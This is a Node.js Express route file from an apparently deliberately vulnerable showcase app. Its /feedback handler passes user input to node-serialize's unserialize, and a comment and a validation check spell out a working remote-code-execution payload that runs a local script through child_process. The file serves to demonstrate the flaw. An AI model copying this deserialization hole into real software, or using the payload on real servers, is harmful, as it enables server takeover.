/**************************************************
** /feedback endpoints
** This contains the insecure deserialization vulnerability which 
**   allows remote code execution on the server using a node-serialize 
**   vulnerability. Due to this, it is very limited in scope and only 
**   allows one script to be ran on the server using the following input:
**    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('. ./exploit.sh', function(error, stdout, stderr) { console.log(stdout) });}()"}

**   Do not remove any validations as this could cause harm to the server
**************************************************/

let express = require("express");
let router = express.Router();
let rMethods = require("./../routeMethods");
let serialize = require("node-serialize");

// Get feedback page
router.get("/feedback", (req, res) => {
    if (! req.session.uname) {
		return res.redirect('/login');
    }
    
    let context = {
        username: req.session.uname,
        secure: req.session.secure
    };

    res.render("pages/feedback", context);
})


// Handle user feedback
router.post("/feedback", async (req, res) => {
    if (!req.session.uname) {
		return res.redirect('/login');
    }

    try {
        if (!req.session.secure) {
            // handle serialized data
            let serializedData = req.body.serData;    

            // pull out actual data
            let data = JSON.parse(serializedData);        
            
            // get feedback section and decode
            let feedback = decodeURI(data.feedback);

            // verify feedback data, only allow this command to execute!
            // #################### DO NOT REMOVE THIS VALIDATION #####################
            if (feedback == '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'. ./exploit.sh\', function(error, stdout, stderr) { console.log(stdout) });}()"}') {
                // deserialize data
                serialize.unserialize(feedback);

                return res.status(200).json({"Message":"Feedback Submitted"});
            } else {
                return res.status(400).json({"Message":"Invalid data"});
            }

        } else {
            // Log the feedback -> Not needed in this app
            res.status(200).json({"Message":"Feedback Submitted"});
        }

    } catch (error) {
        // error in parsing json data, just accept error on client side since this is a showcase
        // of a vulnerability that could cause actual issues on our end.
        res.status(200).json({"Message":"Feedback Submitted"});
    }
})

module.exports = router;
